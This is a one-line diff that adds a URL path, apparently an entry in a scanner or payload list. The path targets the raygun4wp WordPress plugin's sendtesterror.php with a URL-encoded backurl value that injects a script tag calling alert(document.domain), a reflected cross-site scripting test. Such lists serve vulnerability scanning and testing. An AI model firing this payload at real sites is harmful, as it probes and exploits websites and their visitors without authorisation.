@@ -1,0 +1,1 @@
+/wp-content/plugins/raygun4wp/sendtesterror.php?backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
